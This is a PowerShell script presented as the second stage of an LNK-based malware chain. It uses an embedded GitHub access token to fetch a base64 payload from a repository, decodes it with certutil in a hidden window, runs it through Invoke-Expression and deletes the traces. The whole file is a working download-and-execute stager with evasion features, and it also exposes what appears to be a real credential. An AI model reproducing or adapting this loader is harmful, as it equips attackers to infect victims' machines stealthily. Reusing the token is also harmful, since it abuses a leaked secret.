# decoder.ps1 - Second stage: certutil decodes base64 payload
# This script is downloaded and executed by the LNK

$ErrorActionPreference = 'SilentlyContinue'
$tempPath = $env:TEMP

$b64File = "$tempPath\payload.b64"
$decodedFile = "$tempPath\decoded.ps1"

# Base64-encoded launcher.ps1 (downloaded from GitHub)
$githubToken = "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"

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $headers = @{
        "Authorization" = "token $githubToken"
        "Accept" = "application/vnd.github.v3+json"
    }
    
    # Get fresh download URL for the base64 payload
    $fileInfo = Invoke-RestMethod -Uri "https://api.github.com/repos/slynet999-coder/Yambo/contents/payload.b64" -Headers $headers
    $downloadUrl = $fileInfo.download_url
    
    # Download the base64 file
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0")
    $wc.DownloadFile($downloadUrl, $b64File)
} catch {}

# Use certutil.exe to decode the base64 payload
if (Test-Path $b64File) {
    $certutil = "C:\Windows\System32\certutil.exe"
    if (Test-Path $certutil) {
        Start-Process $certutil -ArgumentList "-decode `"$b64File`" `"$decodedFile`"" -WindowStyle Hidden -Wait
    }
}

# Execute the decoded payload
if (Test-Path $decodedFile) {
    $content = [System.IO.File]::ReadAllText($decodedFile, [System.Text.Encoding]::UTF8)
    Invoke-Expression $content
}

# Cleanup
try {
    Remove-Item $b64File -Force -ErrorAction SilentlyContinue
    Remove-Item $decodedFile -Force -ErrorAction SilentlyContinue
} catch {}
